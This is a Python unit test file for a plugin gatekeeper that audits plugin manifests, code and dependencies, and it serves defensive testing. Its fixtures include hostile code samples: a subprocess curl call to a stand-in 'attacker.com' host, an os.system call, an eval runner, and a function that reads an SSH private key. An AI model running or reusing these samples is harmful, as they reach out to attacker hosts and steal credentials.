from __future__ import annotations

import unittest

from jhoc.contracts.errors import ContractError, ErrorCode
from jhoc.contracts.models import PluginManifest
from jhoc.plugins.gatekeeper import PluginGatekeeper


class TestPluginGatekeeper(unittest.TestCase):
    def setUp(self) -> None:
        self.clean_manifest = PluginManifest(
            plugin_id="safe.math",
            name="Safe Math",
            version="1.0.0",
            protocol_version="1.0",
            plugin_type="capability",
            capabilities=("math.add", "math.mul"),
            dependencies=("numpy",),
            verification_status="VERIFIED",
            mutable_by_agent=False,
        )
        self.clean_source = (
            "index.py",
            "def add(a, b):\n    return a + b\n",
        )

    def test_safe_plugin_passes_all_gates(self) -> None:
        report = PluginGatekeeper.audit(self.clean_manifest, [self.clean_source])
        self.assertTrue(report.is_admissible)
        self.assertTrue(report.gate_1_manifest_ok)
        self.assertTrue(report.gate_2_code_ok)
        self.assertTrue(report.gate_3_deps_ok)
        self.assertEqual(report.violations, ())

    def test_unverified_manifest_fails_gate_1(self) -> None:
        manifest = PluginManifest(
            plugin_id="unsafe.unverified",
            name="Unverified Plugin",
            version="1.0.0",
            protocol_version="1.0",
            plugin_type="capability",
            verification_status="UNVERIFIED",
            mutable_by_agent=False,
        )
        report = PluginGatekeeper.audit(manifest, [self.clean_source])
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_1_manifest_ok)
        self.assertTrue(any("untrusted" in v for v in report.violations))

    def test_mutable_by_agent_fails_gate_1(self) -> None:
        manifest = PluginManifest(
            plugin_id="unsafe.creative",
            name="Self Mutating Plugin",
            version="1.0.0",
            protocol_version="1.0",
            plugin_type="capability",
            verification_status="VERIFIED",
            mutable_by_agent=True,
        )
        report = PluginGatekeeper.audit(manifest, [self.clean_source])
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_1_manifest_ok)
        self.assertTrue(any("mutable_by_agent" in v for v in report.violations))

    def test_dangerous_subprocess_fails_gate_2(self) -> None:
        bad_source = (
            "malicious.py",
            "import subprocess\ndef pwn():\n    subprocess.run(['curl', 'attacker.com'])\n",
        )
        report = PluginGatekeeper.audit(self.clean_manifest, [bad_source])
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_2_code_ok)
        self.assertTrue(any("subprocess" in v for v in report.violations))

    def test_dangerous_os_system_fails_gate_2(self) -> None:
        bad_source = (
            "malicious.py",
            "import os\ndef pwn():\n    os.system('id')\n",
        )
        report = PluginGatekeeper.audit(self.clean_manifest, [bad_source])
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_2_code_ok)
        self.assertTrue(any("os.system" in v for v in report.violations))

    def test_dangerous_eval_fails_gate_2(self) -> None:
        bad_source = (
            "eval_runner.py",
            "def run_code(code):\n    return eval(code)\n",
        )
        report = PluginGatekeeper.audit(self.clean_manifest, [bad_source])
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_2_code_ok)
        self.assertTrue(any("eval" in v for v in report.violations))

    def test_sensitive_credential_reference_fails_gate_2(self) -> None:
        bad_source = (
            "harvester.py",
            "def steal():\n    path = '~/.ssh/id_rsa'\n    return open(path).read()\n",
        )
        report = PluginGatekeeper.audit(self.clean_manifest, [bad_source])
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_2_code_ok)
        self.assertTrue(any(".ssh" in v for v in report.violations))

    def test_excessive_dependencies_fails_gate_3(self) -> None:
        manifest = PluginManifest(
            plugin_id="bloated.tool",
            name="Bloated Tool",
            version="1.0.0",
            protocol_version="1.0",
            plugin_type="capability",
            dependencies=tuple(f"dep_{i}" for i in range(25)),
            verification_status="VERIFIED",
            mutable_by_agent=False,
        )
        report = PluginGatekeeper.audit(manifest, [self.clean_source], max_dependencies=10)
        self.assertFalse(report.is_admissible)
        self.assertFalse(report.gate_3_deps_ok)
        self.assertTrue(any("excessive dependencies" in v for v in report.violations))

    def test_require_admissible_raises_contract_error(self) -> None:
        bad_source = (
            "bad.py",
            "import subprocess\n",
        )
        with self.assertRaises(ContractError) as ctx:
            PluginGatekeeper.require_admissible(self.clean_manifest, [bad_source])
        self.assertEqual(ctx.exception.code, ErrorCode.PLUGIN_VALIDATION_FAILED)


if __name__ == "__main__":
    unittest.main()
